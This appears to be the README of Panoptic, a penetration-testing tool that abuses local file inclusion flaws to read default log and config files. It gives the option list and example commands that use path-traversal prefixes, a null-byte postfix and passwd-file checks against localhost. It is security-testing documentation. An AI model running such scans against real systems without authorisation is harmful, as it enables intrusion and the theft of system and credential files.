Panoptic
===

Search default file locations through LFI for common log and config files

### Help Menu
    Usage: panoptic.py --url TARGET [options]

    Options:
        -h, --help            show this help message and exit
        -u TARGET, --url=TARGET
                                set the target to test
        -p PARAM, --param=PARAM
                                set parameter name to test for
        -d DATA, --data=DATA  set data for POST request
        -o OS, --os=OS        set operating system to limit searches to
        -s SOFTWARE, --software=SOFTWARE
                                set name of the software to search for
        -c CATEGORY, --category=CATEGORY
                                set specific category of software to look for
        -t CLASSIFICATION, --type=CLASSIFICATION
                                set type of file to search for ("conf" or "log")
        -b PREFIX, --prefix=PREFIX
                                set prefix for file path (e.g. "../")
        -e POSTFIX, --postfix=POSTFIX
                                set prefix for file path (e.g. "%00")
        -m MULTIPLIER, --multiplier=MULTIPLIER
                                set number to multiply the prefix by
        -w, --write-file      write all found files to output folder
        -x, --skip-passwd-test
                                skip special tests if *NIX passwd file is found
        -l LIST, --list=LIST  list available filters ("os", "category", "software")
        -v, --verbose         display extra information in the output

### Examples
    ./panoptic.py --help

    ./panoptic.py --url http://localhost/lfi.php?file=test.txt
    ./panoptic.py --url http://localhost/lfi.php?file=test.txt&id=1 --param file
    ./panoptic.py --url http://localhost/lfi.php --data "file=test.txt&id=1" --param file

    ./panoptic.py --list software
    ./panoptic.py --list category
    ./panoptic.py --list os

    ./panoptic.py --url http://localhost/lfi.php?file=test.txt --os Windows
    ./panoptic.py --url http://localhost/lfi.php?file=test.txt --software WAMP

    ./panoptic.py --url http://localhost/lfi.php?file=test.txt --verbose --write-file
    ./panoptic.py --url http://localhost/lfi.php?file=test.txt --prefix "../" --multiplier 4 --postfix "%00"


